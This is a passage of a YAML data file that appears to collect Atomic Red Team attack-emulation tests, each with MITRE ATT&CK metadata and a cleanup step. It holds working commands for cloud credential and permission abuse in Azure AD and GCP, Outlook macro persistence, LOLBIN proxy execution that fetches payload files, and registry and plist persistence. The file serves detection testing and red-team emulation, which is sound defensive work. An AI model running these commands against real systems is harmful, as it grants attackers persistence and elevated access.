      \ Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel\
      \ 2.0) For example, in Entra ID environments, an adversary with the Application\
      \ Administrator role can add a new set of credentials to their application's\
      \ service principal. In doing so the adversary would be able to access the service\
      \ principal\u2019s roles and permissions, which may be different from those\
      \ of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation)\
      \ \n\nIn AWS environments, adversaries with the appropriate permissions may\
      \ also use the `sts:GetFederationToken` API call to create a temporary set of\
      \ credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606)\
      \ tied to the permissions of the original user account. These temporary credentials\
      \ may remain valid for the duration of their lifetime even if the original account\u2019\
      s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation\
      \ Persistence)\n\nIn Entra ID environments with the app password feature enabled,\
      \ adversaries may be able to add an app password to a user account.(Citation:\
      \ Mandiant APT42 Operations 2024) As app passwords are intended to be used with\
      \ legacy devices that do not support multi-factor authentication (MFA), adding\
      \ an app password can allow an adversary to bypass MFA requirements. Additionally,\
      \ app passwords may remain valid even if the user\u2019s primary password is\
      \ reset.(Citation: Microsoft Entra ID App Passwords)"
    mitre_examples: []
    mitre_id: T1098.001
    mitre_mitigations: []
    mitre_name: Additional Cloud Credentials
    mitre_platforms: *id006
    mitre_references:
    - https://attack.mitre.org/techniques/T1098/001
    - https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/
    - https://expel.io/blog/finding-evil-in-aws/
    - https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5
    - https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/
    - https://www.lacework.com/blog/detecting-ai-resource-hijacking-with-composite-alerts
    - https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add
    - https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud
    - https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815
    - https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1
    - https://learn.microsoft.com/en-us/entra/identity/authentication/howto-mfa-app-passwords
    - https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/
    - https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations
    - https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/
    - https://sysdig.com/blog/scarleteel-2-0/
    - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
    mitre_related_techniques: []
  name: Azure AD Application Hijacking - App Registration
  platforms:
  - azure-ad
  prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
    {exit 0} else {exit 1}} catch {exit 1}

    '
  references: []
- atomic_id: bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c
  cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"
    /f >nul 2>&1

    del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1

    '
  command: 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"
    /t REG_DWORD /d 1 /f

    mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1

    echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM

    '
  description: "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/\
    \ \nit is possible to use Outlook Macro as a way to achieve persistance and execute\
    \ arbitrary commands. This transform Outlook into a C2.\nToo achieve this two\
    \ things must happened on the syste\n- The macro security registry value must\
    \ be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook\
    \ Folder.\n"
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'File: File Creation'
    - 'Application Log: Application Log Content'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'File: File Modification'
    - 'Module: Module Load'
    - 'Process: Process Creation'
    - 'Windows Registry: Windows Registry Key Creation'
    - 'Command: Command Execution'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may leverage Microsoft Office-based applications
      for persistence between startups. Microsoft Office is a fairly common application
      suite on Windows-based operating systems within an enterprise network. There
      are multiple mechanisms that can be used with Office for persistence when an
      Office-based application is started; this can include the use of Office Template
      Macros and add-ins.


      A variety of features have been discovered in Outlook that can be abused to
      obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost
      Ruler GitHub) These persistence mechanisms can work within Outlook or be used
      through Office 365.(Citation: TechNet O365 Outlook Rules)'
    mitre_examples: []
    mitre_id: T1137
    mitre_mitigations: []
    mitre_name: Office Application Startup
    mitre_platforms:
    - Windows
    - Office Suite
    mitre_references:
    - https://attack.mitre.org/techniques/T1137
    - https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack
    - https://blogs.technet.microsoft.com/office365security/defending-against-rules-and-forms-injection/
    - https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746
    - https://github.com/sensepost/ruler
    - https://github.com/sensepost/notruler
    - https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943
    mitre_related_techniques: []
  name: Office Application Startup - Outlook as a C2
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
  cleanup_command: 'gcloud iam service-accounts delete #{service-account-email} --quiet

    '
  command: 'gcloud config set project #{project-id}

    gcloud iam service-accounts create #{service-account-name}

    gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}

    '
  description: 'GCP Service Accounts can be used to gain intial access as well as
    maintain persistence inside Google Cloud.

    '
  get_prereq_command: 'echo "Please Install Google Cloud SDK before running this atomic
    test : https://cloud.google.com/sdk/docs/install"

    '
  input_arguments:
    output-key-file:
      default: gcp-art-service-account-1.json
      description: Email of the service account
      type: string
    project-id:
      default: art-project-1
      description: ID of the project, you want to create service account as well as
        service account key for
      type: string
    service-account-email:
      default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
      description: Email of the service account
      type: string
    service-account-name:
      default: gcp-art-service-account-1
      description: Name of the service account
      type: string
  mitre_info:
    mitre_data_sources: &id007
    - 'User Account: User Account Authentication'
    - 'Logon Session: Logon Session Metadata'
    - 'Logon Session: Logon Session Creation'
    mitre_defensive_measures: []
    mitre_description: "Valid accounts in cloud environments may allow adversaries\
      \ to perform actions to achieve Initial Access, Persistence, Privilege Escalation,\
      \ or Defense Evasion. Cloud accounts are those created and configured by an\
      \ organization for use by users, remote support, services, or for administration\
      \ of resources within a cloud service provider or SaaS application. Cloud Accounts\
      \ can exist solely in the cloud; alternatively, they may be hybrid-joined between\
      \ on-premises systems and the cloud through syncing or federation with other\
      \ identity sources such as Windows Active Directory. (Citation: AWS Identity\
      \ Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying\
      \ AD Federation)\n\nService or user accounts may be targeted by adversaries\
      \ through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566),\
      \ or various other means to gain access to the environment. Federated or synced\
      \ accounts may be a pathway for the adversary to affect both on-premises systems\
      \ and cloud environments - for example, by leveraging shared credentials to\
      \ log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High\
      \ privileged cloud accounts, whether federated, synced, or cloud-only, may also\
      \ allow pivoting to on-premises environments by leveraging SaaS-based [Software\
      \ Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands\
      \ on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional\
      \ Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised\
      \ cloud account to maintain persistence in the environment. Such credentials\
      \ may also be used to bypass security controls such as multi-factor authentication.\
      \ \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)\
      \ or other privileges through various means within the environment. Misconfigurations\
      \ in role assignments or role assumption policies may allow an adversary to\
      \ use these mechanisms to leverage permissions outside the intended scope of\
      \ the account. Such over privileged accounts may be used to harvest sensitive\
      \ data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)\
      \ or other methods. \n"
    mitre_examples: []
    mitre_id: T1078.004
    mitre_mitigations: []
    mitre_name: Cloud Accounts
    mitre_platforms: &id008
    - SaaS
    - IaaS
    - Office Suite
    - Identity Provider
    mitre_references:
    - https://attack.mitre.org/techniques/T1078/004
    - https://aws.amazon.com/identity/federation/
    - https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction
    - https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs
    mitre_related_techniques: []
  name: Creating GCP Service Account and Service Account Key
  platforms:
  - google-workspace
  - iaas:gcp
  prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit 1; fi;

    '
  references: []
- atomic_id: 348f4d14-4bd3-4f6b-bd8a-61237f78b3ac
  cleanup_command: 'Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name}
    -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force

    Remove-AzAutomationAccount -ResourceGroupName #{resource_group} -Name #{automation_account_name}
    -Force

    Remove-AzResourceGroup -Name #{resource_group} -Force

    echo "Cleanup should be completed. Run ''terraform destroy` to ensure remaining
    resources are also deleted."

    cd "$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"

    terraform destroy -auto-approve

    '
  command: 'New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName
    #{resource_group} -Description ''my-test-runbook'' -AutomationAccountName #{automation_account_name}

    '
  description: 'Identifies when an Azure Automation runbook is created or modified.
    An adversary may create or modify an Azure

    Automation runbook to execute malicious code and maintain persistence in their
    target''s environment.

    '
  get_prereq_command: 'echo "Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli
    (URL accurate as of Nov. 15, 2024)."

    '
  input_arguments:
    automation_account_name:
      default: ART-AutomationAccountName-T1078-004
      description: Name of the automation account name
      type: string
    resource_group:
      default: ART-ResourceGroupName-T1078-004
      description: Name of the resource group
      type: string
    runbook_name:
      default: ART-RunbookName-T1078-004
      description: Name of the runbook name
      type: string
  mitre_info:
    mitre_data_sources: *id007
    mitre_defensive_measures: []
    mitre_description: "Valid accounts in cloud environments may allow adversaries\
      \ to perform actions to achieve Initial Access, Persistence, Privilege Escalation,\
      \ or Defense Evasion. Cloud accounts are those created and configured by an\
      \ organization for use by users, remote support, services, or for administration\
      \ of resources within a cloud service provider or SaaS application. Cloud Accounts\
      \ can exist solely in the cloud; alternatively, they may be hybrid-joined between\
      \ on-premises systems and the cloud through syncing or federation with other\
      \ identity sources such as Windows Active Directory. (Citation: AWS Identity\
      \ Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying\
      \ AD Federation)\n\nService or user accounts may be targeted by adversaries\
      \ through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566),\
      \ or various other means to gain access to the environment. Federated or synced\
      \ accounts may be a pathway for the adversary to affect both on-premises systems\
      \ and cloud environments - for example, by leveraging shared credentials to\
      \ log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High\
      \ privileged cloud accounts, whether federated, synced, or cloud-only, may also\
      \ allow pivoting to on-premises environments by leveraging SaaS-based [Software\
      \ Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands\
      \ on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional\
      \ Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised\
      \ cloud account to maintain persistence in the environment. Such credentials\
      \ may also be used to bypass security controls such as multi-factor authentication.\
      \ \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)\
      \ or other privileges through various means within the environment. Misconfigurations\
      \ in role assignments or role assumption policies may allow an adversary to\
      \ use these mechanisms to leverage permissions outside the intended scope of\
      \ the account. Such over privileged accounts may be used to harvest sensitive\
      \ data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)\
      \ or other methods. \n"
    mitre_examples: []
    mitre_id: T1078.004
    mitre_mitigations: []
    mitre_name: Cloud Accounts
    mitre_platforms: *id008
    mitre_references:
    - https://attack.mitre.org/techniques/T1078/004
    - https://aws.amazon.com/identity/federation/
    - https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction
    - https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs
    mitre_related_techniques: []
  name: Azure Persistence Automation Runbook Created or Modified
  platforms:
  - iaas:azure
  prereq_command: 'terraform version

    '
  references: []
- atomic_id: 94ea9cc3-81f9-4111-8dde-3fb54f36af4b
  cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String\
    \ \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential\
    \ -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\
    \n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\
    )\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete\
    \ it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found\
    \ several app with name '#{application_name}': one is likely the one this technique\
    \ created, but as a precaution, none will be deleted. Manual cleanup is required.\"\
    \n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n\
    \  Write-Host \"Successfully deleted app\"\n}\n"
  command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"\
    #{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential\
    \ -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\
    \n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\
    \n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n\
    #$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\
    \n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal\
    \ -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess\
    \ for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n\
    $requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess\
    \ = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\
    \n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\
    \n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\n\
    if($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n\
    $resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n\
    #Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n\
    }\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource\
    \ API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess\
    \ = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n\
    $requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing\
    \ Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess\
    \ $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal\
    \ -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment\
    \ -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId\
    \ -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n"
  description: 'The adversaries want to add permission to newly created application.
    Application could be then used for persistence or for further operation in the
    attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory
    in particular can be a valuable target for a threat actor.

    This technique will create a new app, with the provided name, and give it the
    provided permission. But if you prefer to add credentials to an existing app,
    replace in the code: "Get-AzureADApplication" instead of "New-AzureADServicePrincipal".

    The DirectoryRecommendations.Read.All permissions has been selected as the default.


    The account you use to run the PowerShell command should have Global Administrator/Application
    Administrator/Cloud Application Administrator role in your Azure AD.


    Detection hint - check Operation Name "Add app role assignment to service principal"
    in subscriptions Activity Logs.

    You can also take a look at the materials:

    https://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/

    https://github.com/reprise99/Sentinel-Queries

    https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766

    https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb

    '
  get_prereq_command: 'Install-Module -Name AzureAD -Force

    '
  input_arguments:
    application_name:
      default: test_app
      description: Name of the targeted application that will be created
      type: string
    application_permission:
      default: DirectoryRecommendations.Read.All
      description: Permission from Microsoft Graph Resource API that will be added
        to application
      type: string
    password:
      default: p4sswd
      description: Azure AD password
      type: string
    username:
      default: jonh@contoso.com
      description: Azure AD username
      type: string
  mitre_info:
    mitre_data_sources:
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    - 'Active Directory: Active Directory Object Modification'
    - 'File: File Modification'
    - 'Group: Group Modification'
    - 'User Account: User Account Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may manipulate accounts to maintain and/or elevate\
      \ access to victim systems. Account manipulation may consist of any action that\
      \ preserves or modifies adversary access to a compromised account, such as modifying\
      \ credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These\
      \ actions could also include account activity designed to subvert security policies,\
      \ such as performing iterative password updates to bypass password duration\
      \ policies and preserve the life of compromised credentials. \n\nIn order to\
      \ create or manipulate accounts, the adversary must already have sufficient\
      \ permissions on systems or the domain. However, account manipulation may also\
      \ lead to privilege escalation where modifications grant access to additional\
      \ roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
    mitre_examples: []
    mitre_id: T1098
    mitre_mitigations: []
    mitre_name: Account Manipulation
    mitre_platforms:
    - Windows
    - IaaS
    - Linux
    - macOS
    - SaaS
    - Network
    - Containers
    - Office Suite
    - Identity Provider
    mitre_references:
    - https://attack.mitre.org/techniques/T1098
    - https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html
    - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670
    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738
    - https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM
    - https://github.com/gentilkiwi/mimikatz/issues/92
    mitre_related_techniques: []
  name: Azure AD - adding permission to application
  platforms:
  - azure-ad
  prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
    {exit 0} else {exit 1}} catch {exit 1}

    '
  references: []
- atomic_id: 11979f23-9b9d-482a-9935-6fc9cd022c3e
  cleanup_command: 'sudo rm #{script_destination}

    sudo rm /private/var/db/emondClients/#{empty_file}'
  command: 'sudo cp #{script_location} #{script_destination}

    sudo touch /private/var/db/emondClients/#{empty_file}

    '
  description: "This test adds persistence via a plist to execute via the macOS Event\
    \ Monitor Daemon. \n"
  get_prereq_command: ''
  input_arguments:
    empty_file:
      default: randomflag
      description: Random name of the empty file used to trigger emond service
      type: string
    script_destination:
      default: /etc/emond.d/rules/atomicredteam_T1543_001.plist
      description: Path where to move the evil plist
      type: path
    script_location:
      default: $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist
      description: evil plist location
      type: path
  mitre_info:
    mitre_data_sources:
    - 'File: File Modification'
    - 'Service: Service Modification'
    - 'File: File Creation'
    - 'Service: Service Creation'
    - 'Command: Command Execution'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may create or modify launch agents to repeatedly\
      \ execute malicious payloads as part of persistence. When a user logs in, a\
      \ per-user launchd process is started which loads the parameters for each launch-on-demand\
      \ user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>,\
      \ <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation:\
      \ AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation:\
      \ Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments\
      \ </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name,\
      \ executable location, and execution time.(Citation: OSX.Dok Malware) Launch\
      \ Agents are often installed to perform updates to programs, launch user specified\
      \ programs at login, or to conduct other developer tasks.\n\n Launch Agents\
      \ can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001)\
      \ command.\n \nAdversaries may install a new Launch Agent that executes at login\
      \ by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code>\
      \ or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy\
      \ Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent\
      \ name may be disguised by using a name from the related operating system or\
      \ benign software. Launch Agents are created with user level privileges and\
      \ execute with user level permissions.(Citation: OSX Malware Detection)(Citation:\
      \ OceanLotus for OS X) "
    mitre_examples: []
    mitre_id: T1543.001
    mitre_mitigations: []
    mitre_name: Launch Agent
    mitre_platforms:
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1543/001
    - https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
    - https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/
    - https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update
    - https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    - https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf
    - https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/
    - https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/
    mitre_related_techniques: []
  name: Event Monitor Daemon Persistence
  platforms:
  - macos
  prereq_command: ''
  references: []
- atomic_id: 0e1483ba-8f0c-425d-b8c6-42736e058eaa
  cleanup_command: ''
  command: "#{dspath} -S #{txt_payload} \n"
  description: 'Emulates attack with a DiskShadow.exe (LOLBIN installed by default
    on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/

    '
  get_prereq_command: 'New-Item -Type Directory (split-path "#{txt_payload}") -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt"
    -OutFile "#{txt_payload}"

    '
  input_arguments:
    dspath:
      default: C:\Windows\System32\diskshadow.exe
      description: Default location of DiskShadow.exe
      type: path
    txt_payload:
      default: PathToAtomicsFolder\T1218\src\T1218.txt
      description: txt to execute
      type: path
  mitre_info:
    mitre_data_sources: &id009
    - 'Network Traffic: Network Connection Creation'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Module: Module Load'
    - 'File: File Creation'
    - 'Process: OS API Execution'
    - 'Process: Process Creation'
    - 'Command: Command Execution'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may bypass process and/or signature-based defenses
      by proxying execution of malicious content with signed, or otherwise trusted,
      binaries. Binaries used in this technique are often Microsoft-signed files,
      indicating that they have been either downloaded from Microsoft or are already
      native in the operating system.(Citation: LOLBAS Project) Binaries signed with
      trusted digital certificates can typically execute on Windows systems protected
      by digital signature validation. Several Microsoft signed binaries that are
      default on Windows installations can be used to proxy execution of other files
      or commands.


      Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code>
      to proxy execution of malicious commands.(Citation: split man page)(Citation:
      GTFO split)'
    mitre_examples: []
    mitre_id: T1218
    mitre_mitigations: []
    mitre_name: System Binary Proxy Execution
    mitre_platforms: &id010
    - Windows
    - Linux
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1218
    - https://gtfobins.github.io/gtfobins/split/
    - https://github.com/LOLBAS-Project/LOLBAS#criteria
    - https://man7.org/linux/man-pages/man1/split.1.html
    mitre_related_techniques: []
  name: DiskShadow Command Execution
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{txt_payload}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 13c0804e-615e-43ad-b223-2dfbacd0b0b3
  cleanup_command: 'del %TEMP%\ie4uinit.exe >nul 2>&1

    del %TEMP%\ieuinit.inf >nul 2>&1

    '
  command: 'copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe

    copy "#{Path_inf}" %TEMP%\ieuinit.inf

    %TEMP%\ie4uinit.exe -BaseSettings

    '
  description: 'Executes commands from a specially prepared ie4uinit.inf file.

    Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/

    Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/

    '
  get_prereq_command: 'New-Item -Type Directory (split-path "#{Path_inf}") -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf"
    -OutFile "#{Path_inf}"

    '
  input_arguments:
    Path_ie4uinit:
      default: c:\windows\system32\ie4uinit.exe
      description: Path to ie4uinit.exe
      type: path
    Path_inf:
      default: PathToAtomicsFolder\T1218\src\ieuinit.inf
      description: Path to the cab file
      type: path
  mitre_info:
    mitre_data_sources: *id009
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may bypass process and/or signature-based defenses
      by proxying execution of malicious content with signed, or otherwise trusted,
      binaries. Binaries used in this technique are often Microsoft-signed files,
      indicating that they have been either downloaded from Microsoft or are already
      native in the operating system.(Citation: LOLBAS Project) Binaries signed with
      trusted digital certificates can typically execute on Windows systems protected
      by digital signature validation. Several Microsoft signed binaries that are
      default on Windows installations can be used to proxy execution of other files
      or commands.


      Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code>
      to proxy execution of malicious commands.(Citation: split man page)(Citation:
      GTFO split)'
    mitre_examples: []
    mitre_id: T1218
    mitre_mitigations: []
    mitre_name: System Binary Proxy Execution
    mitre_platforms: *id010
    mitre_references:
    - https://attack.mitre.org/techniques/T1218
    - https://gtfobins.github.io/gtfobins/split/
    - https://github.com/LOLBAS-Project/LOLBAS#criteria
    - https://man7.org/linux/man-pages/man1/split.1.html
    mitre_related_techniques: []
  name: Lolbas ie4uinit.exe use as proxy
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{Path_inf}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: d34ef297-f178-4462-871e-9ce618d44e50
  cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"
    /f >nul 2>&1

    '
  command: 'reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"
    /v "Driver" /d "#{monitor_dll}" /t REG_SZ /f

    '
  description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
    reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
  get_prereq_command: ''
  input_arguments:
    monitor_dll:
      default: $PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll
      description: Addition to port monitor registry key. Normally refers to a DLL
        name in C:\Windows\System32 but an arbitrary DLL can be specified with the
        absolute path.
      type: path
  mitre_info:
    mitre_data_sources:
    - 'Windows Registry: Windows Registry Key Modification'
    - 'File: File Creation'
    - 'Module: Module Load'
    - 'Process: OS API Execution'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may use port monitors to run an adversary supplied\
      \ DLL during system boot for persistence or privilege escalation. A port monitor\
      \ can be set through the <code>AddMonitor</code> API call to set a DLL to be\
      \ loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\\
      Windows\\System32</code> and will be loaded and run by the print spooler service,\
      \ `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham)\
      \ \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing\
      \ a fully-qualified pathname for that DLL to the `Driver` value of an existing\
      \ or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\\
      Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\
      \n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n"
    mitre_examples: []
    mitre_id: T1547.010
    mitre_mitigations: []
    mitre_name: Port Monitors
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/010
    - https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf
    - https://learn.microsoft.com/en-us/windows/win32/printdocs/addmonitor
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Add Port Monitor persistence in Registry
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: df1efab7-bc6d-4b88-8be9-91f55ae017aa
  cleanup_command: 'net stop w32time

    reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"
    /f

    rm -force C:\Users\Public\AtomicTest.dll

    net start w32time

    '
  command: 'net stop w32time

